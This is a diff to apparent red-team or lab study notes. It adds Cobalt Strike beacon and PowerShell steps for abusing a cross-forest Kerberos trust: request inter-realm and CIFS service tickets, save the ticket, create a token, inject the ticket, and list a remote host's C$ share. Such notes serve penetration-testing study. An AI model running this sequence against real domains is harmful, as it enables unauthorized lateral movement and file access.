@@ -60,6 +60,10 @@ exploitation:
         beacon> krb_asktgs /service:krbtgt/partner.com /ticket:[TGT]
     use inter-realm ticket to request service ticket for CIFS on par-jmp-1
         beacon> krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:[INTER-REALM]
-    
+    save the service ticket to the desktop
+        PS C:\Users\Attacker> [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\tgt.kirbi", [Convert]::FromBase64String("[service ticket]"))
+    now make a new logon session
+        beacon> make_token CONTOSO\rsteel FakePass
+        beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\tgt.kirbi
     check
         beacon> ls \\par-jmp-1.partner.com\c$
